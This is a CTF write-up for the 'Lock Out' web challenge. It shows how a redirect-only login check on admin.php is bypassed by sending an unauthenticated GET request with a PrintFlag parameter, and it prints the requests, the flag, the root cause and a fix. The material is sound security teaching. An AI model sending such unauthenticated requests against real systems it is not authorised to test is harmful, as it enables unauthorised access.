# Lock Out

| Field | Details |
|-------|---------|
| **Challenge** | Lock Out |
| **CTF** | Kali Team CTF 26 |
| **Category** | Web / Broken Access Control |
| **Points** | 100 |
| **Author** | [F4R3S](https://www.linkedin.com/in/f4r3s/) |
| **Description** | "I seem to have locked myself out of my admin panel! Can you find a way back in for me?" |
| **Target** | `456e.chall.kali-team.online:8001` |
| **Flag** | `KaliTeam{d5cd10c0-9980-4b30-9ac2-a6fb6c3dfe6c}` |

---

## Summary

The challenge presented an "Internal Asset Management" admin panel gated
behind a login form (`login.php`). The access control was only enforced
on the *login* flow, not on the privileged action itself
(`admin.php?PrintFlag=1`), allowing the flag to be retrieved without any
valid credentials.

## Recon

Navigating to the admin panel redirected to a login page. Submitting
arbitrary credentials via Burp Repeater:

```
POST /admin.php HTTP/1.1
Host: 456e.chall.kali-team.online:8001
Content-Type: application/x-www-form-urlencoded

username=joe&password=doe
```

returned:

```
HTTP/1.1 302 Found
Location: login.php
```

So the server correctly rejected the bogus login, but critically, the
**302 response body was not empty**. It still contained the full HTML
of the restricted admin dashboard, including the "Industry Night
Shopping List" item card and a form:

```html
<form action="admin.php" method="get" class="action-form">
    <input type="submit" name="PrintFlag" value="Execute: Get_Flag.sh">
</form>
```

This revealed the real target: a **GET** request to `admin.php` with a
`PrintFlag` parameter: a separate code path from the login check, and
one that was never actually protected.

## Exploitation

Sent the GET request directly, with no session/auth at all:

```
GET /admin.php?PrintFlag=1 HTTP/1.1
Host: 456e.chall.kali-team.online:8001
```

The response rendered the flag directly in the page body:

```
[SYSTEM_NOTIFICATION]: FLAG_RECOVERED
KaliTeam{d5cd10c0-9980-4b30-9ac2-a6fb6c3dfe6c}
```

## Root Cause

Classic **broken access control / missing server-side authorization
check**:

- `admin.php` renders privileged content and accepts privileged
  parameters (`PrintFlag`) regardless of authentication state.
- The 302 redirect to `login.php` was cosmetic: a client-side hint,
  not an actual enforcement mechanism, since the full response body
  (and the sensitive action) was still delivered.
- The application trusted that a browser would "follow" the redirect
  and never render the body, instead of validating the session
  server-side before processing the request.

## Fix

- Perform authentication/authorization checks server-side *before* any
  privileged logic runs or output is generated, and short-circuit with
  no body on failure (e.g. `exit;` immediately after the redirect
  header in PHP).
- Never rely on a 3xx redirect alone to gate access: always pair it
  with a hard stop on the server, and re-check auth on every
  sensitive endpoint/parameter independently of how the page was
  reached.

---
*Written with substantial AI assistance in analysis and writing.*
